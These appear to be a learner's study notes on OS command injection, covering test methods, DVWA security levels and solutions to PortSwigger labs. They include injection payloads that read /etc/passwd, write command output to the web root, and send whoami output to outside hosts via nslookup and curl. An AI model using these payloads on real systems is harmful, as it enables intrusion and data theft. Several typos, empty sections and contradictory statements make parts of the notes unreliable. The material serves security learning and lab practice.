# Command Injection with PortSwigger Validation

## What & Why OS Command Injection

* OS command injection is a vulnerability where an attacker executes commands on the victim operating system via a vulnerable web application.
* A command refers to an operation that interacts with the operating system (OS) at an OS level.
* Command injection involves injecting and executing these commands within a system or application.
* There are two types of operating systems used in servers: Windows or Linux.

## Types

* **Inband Command Injection**: where the attacker executes commands on the operating system via a vulnerable web application and receives the response of those executed commands in the web application.
* **Out-of-band Command Injection**: where the attacker executes commands on the operating system via a vulnerable web application and does not receive the executed command output within the web application.

## Impact of CIA

* **Confidentiality**: command injection can be used to view sensitive data.
* **Integrity**: command injection can be used to alter the data.
* **Availability**: command injection can be used to delete the data.

## Finding Command Injection Vulnerability

### BlackBox Perspective

* Map the application
  * Visit all the URLs of the application and walk through all the pages that are accessible within the user context.
  * As you are running, make notes of all the input vectors that talk to the backend and understand how the application works.
  * Enter multiple commands in a single line using `&&`, `|`, `&`, `;`, backticks, and parameters as per the operating system.
    * `Command1 && cammand2`
    * `Cammand1 | cammand2`
    * `Cammand1 & cammand2`
    * `Cammand1 ; cammand2`
    * `Cammand1 \`cammand2\`\`
    * `Cammand1 $(cammand2)`
  * Try to figure out the logic behind the application while running Burp Suite proxy at the backend.
  * Map all instances in the application where there is client-side input.
* Fuzz the application
  * Shell metacharacters: `&`, `&&`, `|`, `||`, `;`, `\n`, `` ` ``, `$()`
* For inband command injection, analyze the response of the application to determine if it is vulnerable. Sometimes the response outputs an error, so use that error to determine whether the application is vulnerable or not.
* For blind command injection:
  * Trigger the time delay using the `ping` or `sleep` commands. This does prove the vulnerability, but it is not impactful; the way to get impact is:
  * Exfiltrate data from the application by outputting the response in the root directory and getting that file directly using the browser.

### WhiteBox Perspective

* Map all the vectors in the application.
* Review source code to determine if any input vectors are added as parameters to functions that execute system commands.

## Exploiting Command Injection

### Inband & Out-of-Band Command Injection

* Using shell metacharacters:
  * Concatenate another commands
    * `&& cat /etc/passwd &`
    * `& cat /etc/passwd &`
    * `|| cat /ect/passwd &`
  * Trigger a time delay
    * `&& sleep 10 &`
    * `&& ping -c 10 127.0.0.01 &`
* Output the response of the command in the web root directly and get that file directly using the browser
  * `& whomai > /var/www/static/whoami.txt &`
* Open an out-of-band channel back to the attacker server
  * `& nslookup attacker.server.com &`
  * `& nslookup $(whoami).attackerserverr.com &`
  * `& nslookup \`whoami\`.attackerserver.com &\`

## Automated Exploitation Tools

* BurpSuite
* Arachni
* Wapiti
* Acunetx
* W3af

## Preventing Command Injection Vulnerabilities

* Never call out to OS commands from application layer code. Instead, implement the required functionality using safer platform APIs.
  * For example: `mkdir()` instead of `system("mkdir /directory_name")`
* Validate that the input is as expected or valid input.

## Executing Multiple Commands

* For example:
* Piping: used in Bash to chain two or more commands together, often for filtering.
* `&&` (And Operator): combines multiple commands, executing them one after another.
* `;` (Semicolon): indicates the end of one command and allows a new command to follow.

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |

## DVWA Low Level Security

* Normal Output Code Input
* When the "submit" button is clicked, data is sent via a POST request.
* `$target` is a request variable containing an IP address.
* The code determines the type of OS and uses different commands based on the OS type:
* If it's Windows, only 4 ping packets are sent.
* If it's Linux, the ping continues until stopped with `-c 4 $target`.

### Vulnerability Output

* The output should describe the vulnerability or potential security issue that exists in the code when dealing with the `$target` variable. However, the vulnerability output appears to be missing from the provided information.

## DVWA Medium Security Level

* Some functions like `&&`, `;`, and `,` are blocked and replaced with `''` (nothing).
* However, it does not block the use of `'One &'` and `|` (pipe) characters.

### Normal Output

### Vulnerability Output

## DVWA High Security Level

* There is a specific issue with the filtering of PIP `|` sections.
* The developer added a space character, which is crucial for proper filtering. Without this space, the PIP commands will work.

### Normal Output

### Vulnerability Output

* The vulnerability output is described as a "human error," suggesting that the omission of the space character in the filtering process can lead to vulnerabilities.
* This vulnerability could potentially allow attackers to execute unauthorized or malicious commands.

## PortSwigger Validation

### OS Command Injection, Simple Case

Notes

* OS command injection, simple case.
* Goal: inject `whoami` commands.
* Already know this is vulnerable; if not, then put the characters to find it.

```
productId=2 &whoam #&storeId=1
```

Error occure then remove the double quote and add the double operator `&&` with URL encoding.

### Blind OS Command Injection with Time Delays

Notes

* Blind OS command injection with time delays.
* Goal: inject the ping commands.
* The blind injection can be detected by ping command.
* The only paramerter which talks to backent is SQL query and Submit forms.

```
& sleep 10 #
```

* The name parameter is not vulnerably.
* The email parameter is vulnerably.
* The email parameter is not vulnerably.

```
||+ping+-c+10+127.0.0.1%0a
```

```
|| ping -c 127.0.0.1/n
```

### Blind OS Command Injection with Output Redirection

Notes:

* Blind OS command injection with output redirection.
* Goal: command injection.

{% stepper %}
{% step %}
### Confirm it is vulnerable to blind command injection

Use `sleep` commands.
{% endstep %}

{% step %}
### Find a place in the application to redirect the injected output

Find where the images are stored. There is an images folder; normally all web application is used `/var/www/images`.
{% endstep %}

{% step %}
### Redirect the injected command into a file

Redirect to images.
{% endstep %}

{% step %}
### Check if the file was created

It is created in `filename=shadow.txt`.

Got the vulnerable parameter using sleep.

Found the images parameter where the injection commands will be saved. `/images/filenames.png`
{% endstep %}
{% endstepper %}

### Blind OS Command Injection with Out-of-Band Interaction

Notes:

* Blind OS command injection with out-of-band interaction.
* Goal: command injection out of band.
* The email paramter is vulnerably.

```
4mrs4lc3ri6vrmzj4sxbxv9oifo5cu.burpcollaborator.net
```

```
& nslookup 4mrs4lc3ri6vrmzj4sxbxv9oifo5cu.burpcollaborator.net #
```

### Blind OS Command Injection with Out-of-Band Data Exfiltration

Notes:

* Blind OS command injection with out-of-band data exfiltration.
* Goal: out-of-band command injection with `whoami`.
* Check the out of band and dns resolved.

```
& nslookup kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net #
```

DNS query is resolveing.

```
& nslookup $(whoami)kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net #
```

```
peter-GMd1wg.kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net.
```

```
`peter-GMd1wg`kzn8h1pj4yjb42czh8arabm4vv1mpb.burpcollaborator.net.
```

```
|| curl ct9pb3705lknc3g2p88ba5e46vcn0do2.oastify.com%0a
```

```
& nslookup `whoami`.ct9pb3705lknc3g2p88ba5e46vcn0do2.oastify.com &
```

```
|| whoami | base64 | curl -d @- ct9pb3705lknc3g2p88ba5e46vcn0do2.oastify.com%0a
```

```
||+whoami+|+base64+|+curl+-d+%40-+ct9pb3705lknc3g2p88ba5e46vcn0do2.oastify.com%0a
```

```
email=||nslookup+`whoami`.ct9pb3705lknc3g2p88ba5e46vcn0do2.oastify.com||
```

```
>>||nslookup+`whoami`.ct9pb3705lknc3g2p88ba5e46vcn0do2.oastify.com||
```
